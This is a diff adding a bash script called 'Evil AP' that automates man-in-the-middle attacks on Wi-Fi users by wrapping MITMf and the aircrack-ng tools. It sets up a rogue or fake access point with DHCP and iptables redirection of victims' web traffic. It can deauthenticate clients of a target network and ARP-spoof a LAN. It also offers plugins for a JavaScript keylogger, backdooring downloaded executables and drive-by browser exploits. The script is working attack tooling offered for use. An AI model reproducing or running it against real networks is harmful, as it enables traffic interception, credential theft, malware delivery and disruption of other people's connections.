@@ -1,0 +1,426 @@
+#! /bin/bash
+
+##             Based on MITMf
+##      to do varieties of MITMf works
+##               by DKing
+
+
+########         Kali 2.0       #########
+
+
+
+RED=$(tput setaf 1)
+GREEN=$(tput bold ; tput setaf 2)
+YELLOW=$(tput bold ; tput setaf 3)
+
+
+######################      FUNCTIONS BELOW       #########################
+
+BASICCONF()
+{
+        ######### Config Part
+        echo $GREEN"MSFconsle's running"
+        gnome-terminal -x msfconsole -x "load msgrpc Pass=pass123"
+        echo "Edit the config First"
+        gedit /opt/MITMf/config/mitmf.conf
+        echo "Edit MSF resource file"
+        gedit MSF.rc
+        echo "Specify a Port which MITMf listens on [10000]"$YELLOW
+        read mitmproxy
+        if [ "$mitmproxy" = "" ]; then         #default value
+                mitmproxy="10000"
+                echo "10000 selected as default"
+        fi
+
+        echo $GREEN"Specify a Port where Ferret-NG listens ,So you can proxy your browser to forge as victim"
+        echo "Dont forget to Specify the victim in MITMf.conf . ONLY one victim is permitted each time."
+        echo "Default Value is 10010"$YELLOW
+        read ferretproxy
+        if [ "$ferretproxy" = "" ]; then         #default value
+                ferretproxy="10010"
+                echo "10010 selected as default"
+        fi
+        # Network questions
+        echo $YELLOW
+        ip route show | awk '(NR == 1) { print "Gateway :", $3,"    ", "Internet Interface :", $5}'
+        iface=$(ip route show | awk '(NR == 1) { print $5}')
+        gateway=$(ip route show | awk '(NR == 1) { print $3}')
+        echo $GREEN
+        echo "Enter the networks gateway IP address or press enter to use $gateway:"
+        echo $YELLOW
+        read -e gatewayip
+        if [ "$gatewayip" = "" ];then
+           gatewayip=$gateway
+         echo "$gatewayip selected as default."
+        fi
+        echo $GREEN
+        echo "Enter your interface that is connected to the internet or press enter to use $iface:"
+        echo $YELLOW
+        read -e internet_interface
+        if [ "$internet_interface" = "" ];then
+           internet_interface=$iface
+         echo "$internet_interface selected as default."
+        fi
+
+}
+
+
+
+
+APconf()
+{
+        echo $GREEN
+        echo "Select your interface to be used for the fake AP:"
+        echo $YELLOW
+        interfaces=`ip link|egrep "^[0-9]+"|cut -d ':' -f 2 |awk {'print $1'} |grep -v lo`
+        select fakeap_interface in $interfaces; do
+          break;
+        done
+
+        echo $GREEN
+        echo "Configuring FakeAP...."
+        echo "Set Airbase-ng in all probes mode?"
+        echo "In this mode your choosen ESSID is not used, but instead airbase-ng responds to all incoming probes"
+        echo $YELLOW "NO as Default"
+        echo $YELLOW "1) Yes"
+        echo " 2) No"
+        echo -n " #? "
+        AIRBASE=0 #Default
+        read yn
+        case $yn in
+            1) AIRBASE=1 ;;
+            2) AIRBASE=0 ;;
+            *) AIRBASE=0 ;;
+        esac
+        sleep 1
+
+        # Preparation
+        killall airbase-ng &> /dev/null
+}
+
+
+MONITOR()
+{
+        ifconfig $fakeap_interface down
+        iwconfig $fakeap_interface mode monitor
+        ifconfig $fakeap_interface up
+}
+
+
+
+CONFAPHOST()
+{
+        echo $GREEN"Enter the ESSID(AP_Name) you would like your rogue AP to be called or press enter to use Test:"
+        echo  $YELLOW
+        read ESSID
+        if [ "$ESSID" = "" ];then
+                ESSID="Test"
+                echo "$ESSID selected as default."
+        fi
+        echo $GREEN"Enter the Channel[1]"$YELLOW
+        read channel
+        if [ "$channel" = "" ];then
+                channel=1
+                echo "$channel selected as default."
+        fi
+        iwconfig ${fakeap_interface} channel ${channel} &
+        sleep 5
+}
+
+
+CONFAPFAKE()
+{
+        echo $GREEN
+        echo "Using airodump-ng to select a target......"
+        echo "Mark down the ESSID and BSSID and Channel"
+        echo "then Ctrl+C to stop"
+        sleep 4
+
+        airodump-ng ${fakeap_interface}
+
+        echo $GREEN"Enter the ESSID(AP_Name) you would like your rogue AP to be called or press enter to use Test:"
+        echo  $YELLOW
+        read ESSID
+        if [ "$ESSID" = "" ];then
+                ESSID="Test"
+                echo "$ESSID selected as default."
+        fi
+
+        echo $GREEN"Enter the BSSID(AP_MAC) of the target AP to DeAuth"$YELLOW
+        read BSSID
+        echo $GREEN"Enter the Channel[1]"$YELLOW
+        read channel
+        if [ "$channel" = "" ];then
+                channel=1
+                echo "$channel selected as default."
+        fi
+        iwconfig ${fakeap_interface} channel ${channel} &
+        echo "Please Wait and dont press any keys"
+        sleep 5
+}
+
+SetupAPcommon()
+{
+        clear
+
+        echo $GREEN"Starting FakeAP..."
+
+        if [ "$AIRBASE" = "1" ]; then
+          xterm -bg black -fg green -geometry 159x38+1+0 -T "FakeAP - $fakeap - $fakeap_interface" -e airbase-ng -P -C 30 $fakeap_interface & fakeapid=$!
+        else
+          xterm -bg black -fg green -geometry 159x38+1+0 -T "FakeAP - $fakeap - $fakeap_interface" -e airbase-ng -c ${channel} -e "$ESSID" $fakeap_interface & fakeapid=$!
+        fi
+        sleep 5
+
+        # DhcpConf creation
+        SUBNET=$(ip route show | awk '(NR == 2)' | cut -d '/' -f1)
+        if [ "$SUBNET" = "192.168.1.1" ]; then
+          SUBNET="192.168.10.0"
+          GATEWAY="192.168.10.1"
+          RANGE="192.168.10.100 192.168.10.200"
+        else
+          SUBNET="192.168.100.0"
+          GATEWAY="192.168.100.1"
+          RANGE="192.168.100.100 192.168.100.200"
+        fi
+
+
+        ######### Iptables
+        echo $GREEN
+
+        ifconfig lo up
+        ifconfig at0 up &
+        sleep 1
+        ifconfig at0 $GATEWAY netmask 255.255.255.0
+        ifconfig at0 mtu 1400
+        echo "Configuring iptables..."
+        read -p $YELLOW"Enter a valid Local IP (NO localhost):" mitmfip
+        route add -net $SUBNET netmask 255.255.255.0 gw $GATEWAY
+        iptables --flush
+        iptables --table nat --flush
+        iptables --delete-chain
+        iptables --table nat --delete-chain
+        echo 1 > /proc/sys/net/ipv4/ip_forward
+        iptables -P FORWARD ACCEPT
+        iptables -A FORWARD --in-interface at0 -j ACCEPT
+        iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to ${mitmfip}:${mitmproxy}
+        iptables -t nat -A POSTROUTING -s $SUBNET/24  -o $internet_interface  -j MASQUERADE
+
+        ######### DHCP
+        mkdir -p /tmp
+        echo "authoritative;
+        default-lease-time 600;
+        max-lease-time 7200;
+        subnet $SUBNET netmask 255.255.255.0 {
+        option routers $GATEWAY;
+        option subnet-mask 255.255.255.0;
+        option domain-name "\"$ESSID\"";
+        option domain-name-servers $GATEWAY;
+        range $RANGE;
+        }" > /tmp/dhcpd.conf
+
+
+        #DHCP server
+        echo $GREEN
+        echo "Setting up DHCP..."
+        xterm -bg black -fg green -geometry 159x38-1+0 -T DHCP -e dhcpd -d -f -cf "/tmp/dhcpd.conf" at0 & dchpid=$!
+        sleep 2
+}
+
+
+EXTRAARGU()
+{
+        clear
+        echo "
+Inject
+        Inject arbitrary content into HTML content
+
+        --inject              Load plugin 'Inject'
+        --js-url JS_URL       URL of the JS to inject
+        --js-payload JS_PAYLOAD
+                        JS string to inject
+        --js-file JS_FILE     File containing JS to inject
+        --html-url HTML_URL   URL of the HTML to inject
+        --html-payload HTML_PAYLOAD
+                        HTML string to inject
+        --html-file HTML_FILE
+                        File containing HTML to inject
+        --per-domain          Inject once per domain per client.
+        --rate-limit RATE_LIMIT
+                        Inject once every RATE_LIMIT seconds per client.
+        --count-limit COUNT_LIMIT
+                        Inject only COUNT_LIMIT times per client.
+        --white-ips IP        Inject content ONLY for these ips (comma seperated)
+        --black-ips IP        DO NOT inject content for these ips (comma seperated)
+        --white-domains DOMAINS
+                        Inject content ONLY for these domains (comma seperated)
+        --black-domains DOMAINS
+                        DO NOT inject content for these domains (comma seperated)
+
+
+ImageRandomizer:
+        Replaces images with a random one from a specified directory
+        --imgrand             Load plugin 'ImageRandomizer'
+        --img-dir DIRECTORY   Directory with images
+
+
+JSKeylogger:
+        Injects a javascript keylogger into clients webpages
+        --jskeylogger         Load plugin 'JSKeylogger'
+
+
+ScreenShotter:
+        Uses HTML5 Canvas to render an accurate screenshot of a clients browser
+        --screen              Load plugin 'ScreenShotter'
+        --interval SECONDS    Interval at which screenshots will be taken (default 10 seconds)
+
+
+FilePwn:
+        Backdoor executables being sent over http using bdfactory
+        --filepwn             Load plugin 'FilePwn'
+
+
+BrowserSniper:
+        Performs drive-by attacks on clients with out-of-date browser plugins
+        --browsersniper       Load plugin 'BrowserSniper'
+
+
+Upsidedownternet:
+        Flips images 180 degrees
+        --upsidedownternet    Load plugin 'Upsidedownternet'
+
+
+        "
+        echo $RED"ANY MORE ARGUMENTS?"
+        echo "Current cmdline:$GREEN   mitmf -l ${mitmproxy} --ferretng --dns --hsts --port ${ferretproxy}  $ARGU"
+        read -p "$RED --EXTRAARGU: $GREEN" EXTRAARGU
+        ARGU=" $ARGU $EXTRAARGU "
+        
+}
+
+
+
+
+ATTACKON()
+{
+        ###########  MITMF
+        gnome-terminal -x mitmf -l ${mitmproxy} --ferretng --dns --hsts --port  ${ferretproxy}  $ARGU
+        sleep 5
+        #############
+        ## Running ##
+        #############
+        echo "
+
+                        OK,Running up.
+        "
+
+        ##########  Cleaning
+        read -p $RED"HIT Enter to Stop Everything "
+        read -p "Confirm to Quit?  "
+}
+
+
+DEAUTH()
+{
+        echo "
+                HIT ENTER to perform DEAUTH ATTACK"        
+        read junk
+        ###########  aireplay-ng DeAuth
+        if [ "$workmethod" = "fake" ];then
+                deauth=Y
+                read -p "Sure to do DeAuth Attack? [Y/n]:" deauth
+                if [ 'deauth' = 'Y' ]; then 
+                        xterm -bg black -geometry 159x38 -T "DeAuthing" -e aireplay-ng -0 10 -a ${BSSID} $fakeap_interface &
+                fi
+        fi
+}
+
+
+CLEANUP()
+{
+
+        echo $GREEN
+        echo "Cleaning up Running Process and Resetting iptables..." $YELLOW
+        kill ${fakeapid} &> /dev/null
+        kill ${dchpid} &> /dev/null
+        kill ${mitmfid} &> /dev/null
+        pkill ruby
+        pkill dhcpd
+        pkill airbase-ng
+        rm /var/run/dhcpd.pid 2>/dev/nul
+        echo 0 > /proc/sys/net/ipv4/ip_forward
+        iptables --flush
+        iptables --table nat --flush
+        iptables --delete-chain
+        iptables --table nat --delete-chain
+
+        echo $GREEN
+        echo "Cleaned up successful..."
+        echo "Done.
+        "
+}
+
+
+#########################     FUNCTION AREA  END    ########################################
+
+#########################     MAIN ENTRY AREA    ########################################
+
+echo $GREEN 
+figlet "    E v i l   A P"
+echo "           v1.0     by DKing"
+
+
+if [ $# = 0 ] || [ "$1" = "-h" ]||[ "$1" = "--help" ]; then
+
+        echo "
+                -h    --help            You are looking at it
+                -c    --clean           Clean up old processes
+                      --client          Connect an AP as Client and perform ARP-Spoofing$RED(DEFAULT)$GREEN
+                      --ap              Work as an AP host$RED(RECOMMENDED for AP)$GREEN
+                      --fakeap          Work as an Fake AP host
+                                        (Masquerade as an existing AP host and perform DEAUTH attack)
+        "
+        exit 0
+
+elif [ "$1" = "-c" ]||[ "$1" = "--clean" ]; then
+        CLEANUP
+        exit 0
+
+fi
+
+########    main function begin     ########
+
+CLEANUP
+BASICCONF
+
+if [ "$1" = "--fakeap" ] ||  [ "$1" = "--ap" ] ; then
+        APconf
+        CONFAPFAKE
+        MONITOR
+        SetupAPcommon
+	if [ "$1" = "--fakeap" ] ; then
+		DEAUTH
+	fi
+        ARGU=" -i at0 "
+        EXTRAARGU
+        ATTACKON
+        pkill python
+
+elif [ "$1" = "--client" ]||[ "$#" = "0" ]; then
+        ARGU="-i $iface --filepwn --spoof --arp --netmask 255.255.255.0 --gateway $gatewayip "
+        EXTRAARGU
+        ATTACKON
+
+else
+        echo "WRONG PARAMETER"
+        exit 0
+fi
+
+
+CLEANUP
+
+
+
+
+
+
